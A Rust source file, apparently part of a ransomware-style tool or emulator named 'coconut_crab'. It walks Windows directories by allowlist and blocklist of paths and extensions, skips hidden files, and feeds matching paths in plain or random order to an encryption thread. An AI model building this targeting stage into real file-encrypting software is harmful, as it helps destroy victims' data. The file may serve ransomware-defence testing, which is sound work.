use std::{
    path::PathBuf,
    sync::Arc,
    thread,
    fs,
    os::windows::prelude::*
};    
use walkdir::{WalkDir, DirEntry};
use crossbeam_channel::Sender;
use rand::{
    SeedableRng,
    rngs::{SmallRng, ThreadRng},
    seq::SliceRandom
};
use log::{debug, error};

use coconut_crab_lib::file::get_lowercase_extension;
use crate::status::STATUS_FILENAME;

pub fn walk(sender: Sender<Arc<PathBuf>>, allowlist_paths_arc: Arc<Vec<PathBuf>>, blocklist_paths_arc: Arc<Option<Vec<PathBuf>>>, allowlist_extensions_arc: Arc<Option<Vec<String>>>, blocklist_extensions_arc: Arc<Option<Vec<String>>>, avoid_hidden_arc: Arc<bool>, ) -> thread::JoinHandle<()> {
    debug!("Starting walk thread");
    thread::spawn(move || {
        for starting_path in allowlist_paths_arc.iter() {
            for entry_result in WalkDir::new(starting_path)
                .follow_links(true)
                .into_iter()
                .filter_entry(|entry| walk_filter(entry, blocklist_paths_arc.as_ref(), avoid_hidden_arc.as_ref())) {
                
                let entry = match entry_result {
                    Ok(entry_result) => {
                        debug!("Walking entry: {:?}", entry_result.path());
                        entry_result
                    },
                    Err(entry_result) => {
                        error!("Error with entry: {:?}", entry_result);
                        continue
                    },
                };

                if entry.path().is_file() {
                    debug!("Entry is a file: {:?}", entry.path());
                    if file_filter(&entry, allowlist_extensions_arc.as_ref(), blocklist_extensions_arc.as_ref()) {
                        debug!("Entry matched filter: {:?}", entry.path());
                        match sender.send(Arc::new(entry.path().to_path_buf())) {
                            Ok(_) => {
                                debug!("Successfully sent path to crypto/analysis/canary thread: {:?}", entry.path());
                            },
                            Err(send_result) => {
                                error!("Failed to send path to crypto/analysis/canary thread: {}", send_result);
                            }
                        }
                    } else {
                        debug!("Entry did not match filter: {:?}", entry.path());
                    }
                } else {
                    debug!("Entry is not a file: {:?}", entry.path());
                }
            }
        }
    })
}

pub fn random_walk(sender: Sender<Arc<PathBuf>>, allowlist_paths_arc: Arc<Vec<PathBuf>>, blocklist_paths_arc: Arc<Option<Vec<PathBuf>>>, allowlist_extensions_arc: Arc<Option<Vec<String>>>, blocklist_extensions_arc: Arc<Option<Vec<String>>>, avoid_hidden_arc: Arc<bool>, ) -> thread::JoinHandle<()> {
    debug!("Starting random walk thread");
    thread::spawn(move || {
        let mut found_paths: Vec<PathBuf> = vec![];
        
        for starting_path in allowlist_paths_arc.iter() {
            for entry_result in WalkDir::new(starting_path)
                .follow_links(true)
                .into_iter()
                .filter_entry(|e| walk_filter(e, blocklist_paths_arc.as_ref(), avoid_hidden_arc.as_ref())) {
                
                let entry = match entry_result {
                    Ok(entry_result) => {
                        debug!("Walking entry: {:?}", entry_result.path());
                        entry_result
                    },
                    Err(entry_result) => {
                        error!("Error with entry: {:?}", entry_result);
                        continue
                    },
                };

                if entry.path().is_file() {
                    debug!("Entry is a file: {:?}", entry.path());
                    if file_filter(&entry, allowlist_extensions_arc.as_ref(), blocklist_extensions_arc.as_ref()) {
                        debug!("Entry matched filter: {:?}", entry.path());
                        found_paths.push(entry.path().to_path_buf());
                    } else {
                        debug!("Entry did not match filter: {:?}", entry.path());
                    }
                } else {
                    debug!("Entry is not a file: {:?}", entry.path());
                }
            }
        }

        let mut rng_cheap = match SmallRng::from_rng(ThreadRng::default()) {
            Ok(rng_cheap_result) => {
                debug!("Succcessfully created cheap random number generator");
                rng_cheap_result
            },
            Err(rng_cheap_result) => {
                error!("Failed to create cheap random number generator: {}", rng_cheap_result);
                return
            },
        };

        found_paths.shuffle(&mut rng_cheap);

        for path in found_paths {
            debug!("Sending path to crypto/analysis/canary thread: {:?}", path);
            match sender.send(Arc::new(path)) {
                Ok(_) => {
                    debug!("Successfully sent path to crypto/analysis/canary thread");
                },
                Err(send_result) => {
                    error!("Failed to send path to crypto/analysis/canary thread: {}", send_result);
                }
            }
        }
    })
}

fn walk_filter(entry: &DirEntry, blocklist_paths_arc: &Option<Vec<PathBuf>>, avoid_hidden_arc: &bool) -> bool {
    let mut entry_match = true;

    if let Some(blocklist_paths) = blocklist_paths_arc {
        debug!("Applying blocklist to entry: {:?}", entry.path());
        if blocklist_paths.contains(&entry.path().to_path_buf()) {
            debug!("Blocklist contains entry: {:?}", entry.path());
            entry_match = false;
        } else {
            debug!("Blocklist does not contain entry: {:?}", entry.path());
        }          
    } else {
        debug!("Not applying blocklist to entry: {:?}", entry.path());
    }

    if *avoid_hidden_arc && is_hidden(entry) {
        debug!("Avoiding hidden entry: {:?}", entry.path());
        entry_match = false;
    }

    entry_match
}

fn file_filter(entry: &DirEntry, allowlist_extensions_arc: &Option<Vec<String>>, blocklist_extensions_arc: &Option<Vec<String>>) -> bool {
    let mut file_match= true;

    if let Some(allowlist_extensions) = allowlist_extensions_arc {
        debug!("Applying allowlist to file: {:?}", entry.path());
        if allowlist_extensions.contains(&get_lowercase_extension(&entry.path().to_path_buf())) {
            debug!("Allowlist contains extension: {:?}",  entry.path());
            file_match = true;
        } else {
            debug!("Allowlist does not contain extension: {:?}", entry.path());
            file_match = false;
        }      
    } else {
        debug!("Not applying allowlist to file: {:?}", entry.path());
    }

    if let Some(blocklist_extensions) = blocklist_extensions_arc {
        debug!("Applying blocklist to file: {:?}", entry.path());
        if blocklist_extensions.contains(&get_lowercase_extension(&entry.path().to_path_buf())) {
            debug!("Blocklist contains file extension: {:?}", entry.path());
            file_match = false;
        } else {
            debug!("Blocklist does not contain file extension: {:?}", entry.path());
        }          
    } else {
        debug!("Not applying blocklist to file: {:?}", entry.path());
    }

    match entry.path().file_name() {
        Some(file_name_result) => {
            debug!("Successfuly got filename: {:?}", file_name_result);
            if file_name_result.to_string_lossy() == STATUS_FILENAME {
                debug!("File is {} Avoiding ouroboros.", STATUS_FILENAME);
                file_match = false;
            }
        },
        None => {
            error!("Failed to get filename: {:?}", entry.path());
        }
    };

    debug!("{:?} matches: {}", entry.path(), file_match);
    file_match
}

fn is_hidden(entry: &DirEntry) -> bool {
    let mut hidden = false;

    if entry.file_name().as_encoded_bytes()[0] == b'.' {
        debug!("Entry is hidden by .: {:?}", entry.path());
        hidden = true;
        return hidden;
    } else {
        debug!("Entry is not hidden by .: {:?}", entry.path());
    }
    
    if let Ok(metadata) = fs::metadata(entry.path()) {
        let attributes = metadata.file_attributes();
        if (attributes & 0x2) > 0 {
            debug!("Entry is hidden by attributes: {:?}", entry.path());
            hidden = true;
        } else {    
            debug!("Entry is not hidden by attributes: {:?}", entry.path());
        }
    } else {
        error!("Error extracting metadata for entry: {:?}", entry.path())
    }

    hidden
}
